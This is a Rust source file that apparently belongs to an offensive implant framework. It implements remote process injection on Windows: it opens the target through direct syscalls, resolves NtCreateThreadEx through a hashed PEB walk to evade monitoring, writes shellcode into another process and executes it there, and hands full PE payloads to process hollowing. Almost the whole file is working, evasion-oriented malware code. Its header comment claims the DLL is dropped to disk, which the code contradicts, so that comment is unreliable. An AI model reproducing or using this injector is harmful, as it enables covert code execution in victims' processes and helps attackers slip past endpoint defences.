use crate::injection::{payload_has_valid_pe_headers, Injector};
/// DLL side-loading injection (S-05).
///
/// Runtime approach:
///   * PE payloads are written as a DLL to a location on the target process's
///     DLL search path, then loaded via `NtCreateThreadEx` → `LoadLibraryA`.
///   * Raw shellcode payloads are injected fully in-memory via
///     `NtAllocateVirtualMemory`/`NtWriteVirtualMemory`/`NtProtectVirtualMemory`
///     and launched directly with `NtCreateThreadEx`.
///
/// The PE path is the runtime equivalent of the build-time side-loading
/// technique produced by `orchestra-side-load-gen`.
///
/// Search-path hijacking order followed (per Windows MSDN):
///   1. The directory from which the application was loaded.
///   2. The system directory (`%SystemRoot%\System32`).
///   3. `%TEMP%` as a fallback.
///
/// The DLL is a minimal PE with a DllMain that allocates a new thread and
/// executes the embedded shellcode payload.  If the payload is a full PE
/// image, the DLL's DllMain calls `hollowing::inject_into_process` against
/// a new svchost.exe process and then returns TRUE so the host process is
/// not disturbed.
use anyhow::{anyhow, Result};

pub struct DllSideLoadInjector;

#[cfg(windows)]
impl Injector for DllSideLoadInjector {
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
        use winapi::um::winnt::{
            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
            PROCESS_VM_READ, PROCESS_VM_WRITE,
        };

        let is_pe = payload_has_valid_pe_headers(payload);

        // ── 1. Open target process via NtOpenProcess ─────────────────────
        // CLIENT_ID structure: { UniqueProcess: HANDLE, UniqueThread: HANDLE }
        let mut client_id = [0u64; 2];
        client_id[0] = pid as u64;
        // Minimal OBJECT_ATTRIBUTES: { Length: ULONG, ... }
        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

        let mut h_proc: usize = 0;
        let access_mask = (PROCESS_VM_OPERATION
            | PROCESS_VM_WRITE
            | PROCESS_VM_READ
            | PROCESS_CREATE_THREAD
            | PROCESS_QUERY_INFORMATION) as u64;
        let open_status = unsafe {
            nt_syscall::syscall!(
                "NtOpenProcess",
                &mut h_proc as *mut _ as u64,
                access_mask,
                &mut obj_attr as *mut _ as u64,
                client_id.as_mut_ptr() as u64,
            )
        };
        match open_status {
            Ok(s) if s >= 0 && h_proc != 0 => {}
            _ => return Err(anyhow!("DllSideLoad: NtOpenProcess(pid={pid}) failed")),
        }
        let h_proc = h_proc as *mut std::ffi::c_void;

        macro_rules! close_h {
            ($h:expr) => {
                nt_syscall::syscall!("NtClose", $h as u64).ok();
            };
        }
        macro_rules! cleanup_and_err {
            ($msg:expr) => {{
                close_h!(h_proc);
                return Err(anyhow!($msg));
            }};
        }

        // ── 2. Resolve NtCreateThreadEx via PEB walk ─────────────────────

        let ntdll_base =
            unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0")) }
                .ok_or_else(|| {
                    close_h!(h_proc);
                    anyhow!("ntdll not found")
                })?;

        let ntcreate_addr = unsafe {
            pe_resolve::get_proc_address_by_hash(
                ntdll_base,
                pe_resolve::hash_str(b"NtCreateThreadEx\0"),
            )
        }
        .ok_or_else(|| {
            close_h!(h_proc);
            anyhow!("NtCreateThreadEx not found")
        })?;

        type NtCreateThreadExFn = unsafe extern "system" fn(
            *mut *mut std::os::raw::c_void,
            u32,
            *mut std::os::raw::c_void,
            *mut std::os::raw::c_void,
            *mut std::os::raw::c_void,
            *mut std::os::raw::c_void,
            u32,
            usize,
            usize,
            usize,
            *mut std::os::raw::c_void,
        ) -> i32;
        let nt_create_thread: NtCreateThreadExFn = unsafe { std::mem::transmute(ntcreate_addr) };

        // ── 3. In-memory shellcode path (no disk write) ──────────────────
        if !is_pe {
            let mut remote_payload: *mut std::ffi::c_void = std::ptr::null_mut();
            let mut alloc_size = payload.len();
            let s = nt_syscall::syscall!(
                "NtAllocateVirtualMemory",
                h_proc as u64, &mut remote_payload as *mut _ as u64,
                0u64, &mut alloc_size as *mut _ as u64,
                (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
            );
            if let Ok(st) = s {
                if st < 0 || remote_payload.is_null() {
                    cleanup_and_err!("DllSideLoad: NtAllocateVirtualMemory for shellcode payload failed");
                }
            } else {
                cleanup_and_err!("DllSideLoad: NtAllocateVirtualMemory for shellcode payload failed");
            }

            let mut written = 0usize;
            let write_ok = match nt_syscall::syscall!(
                "NtWriteVirtualMemory",
                h_proc as u64, remote_payload as u64,
                payload.as_ptr() as u64, payload.len() as u64,
                &mut written as *mut _ as u64,
            ) {
                Ok(s) => s >= 0 && written == payload.len(),
                Err(_) => false,
            };
            if !write_ok {
                let mut free_base = remote_payload as usize;
                let mut free_size = 0usize;
                nt_syscall::syscall!(
                    "NtFreeVirtualMemory",
                    h_proc as u64, &mut free_base as *mut _ as u64,
                    &mut free_size as *mut _ as u64, 0x8000u64,
                ).ok();
                cleanup_and_err!("DllSideLoad: NtWriteVirtualMemory for shellcode failed");
            }

            let mut old_protect = 0u32;
            let mut prot_base = remote_payload as usize;
            let mut prot_size = payload.len();
            let protect_ok = match nt_syscall::syscall!(
                "NtProtectVirtualMemory",
                h_proc as u64, &mut prot_base as *mut _ as u64,
                &mut prot_size as *mut _ as u64,
                PAGE_EXECUTE_READ as u64, &mut old_protect as *mut _ as u64,
            ) {
                Ok(s) => s >= 0,
                Err(_) => false,
            };
            if !protect_ok {
                let mut free_base = remote_payload as usize;
                let mut free_size = 0usize;
                nt_syscall::syscall!(
                    "NtFreeVirtualMemory",
                    h_proc as u64, &mut free_base as *mut _ as u64,
                    &mut free_size as *mut _ as u64, 0x8000u64,
                ).ok();
                cleanup_and_err!("DllSideLoad: NtProtectVirtualMemory to RX failed");
            }

            nt_syscall::syscall!(
                "NtFlushInstructionCache",
                h_proc as u64, remote_payload as u64, payload.len() as u64,
            ).ok();

            let mut h_thread: *mut std::os::raw::c_void = std::ptr::null_mut();
            let status = unsafe {
                nt_create_thread(
                    &mut h_thread,
                    0x1FFFFF,
                    std::ptr::null_mut(),
                    h_proc,
                    remote_payload,
                    std::ptr::null_mut(),
                    0,
                    0,
                    0,
                    0,
                    std::ptr::null_mut(),
                )
            };
            if status < 0 || h_thread.is_null() {
                let mut free_base = remote_payload as usize;
                let mut free_size = 0usize;
                nt_syscall::syscall!(
                    "NtFreeVirtualMemory",
                    h_proc as u64, &mut free_base as *mut _ as u64,
                    &mut free_size as *mut _ as u64, 0x8000u64,
                ).ok();
                cleanup_and_err!(
                    "DllSideLoad: NtCreateThreadEx for shellcode failed: {status:#x}"
                );
            }

            close_h!(h_thread);
            close_h!(h_proc);

            tracing::info!(pid, "DllSideLoad: shellcode injected in-memory (no disk write)");
            return Ok(());
        }

        // ── 4. PE path: in-memory injection via hollowing (no disk write) ──
        // Close our process handle; hollowing::inject_into_process opens its own.
        close_h!(h_proc);
        hollowing::inject_into_process(pid, payload)
            .map_err(|e| anyhow!("DllSideLoad: in-memory PE injection failed: {e}"))?;
        tracing::info!(pid, "DllSideLoad: PE injected in-memory (no disk write)");
        Ok(())
    }
}

#[cfg(not(windows))]
impl Injector for DllSideLoadInjector {
    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
        Err(anyhow!("DLL side-loading is only supported on Windows"))
    }
}
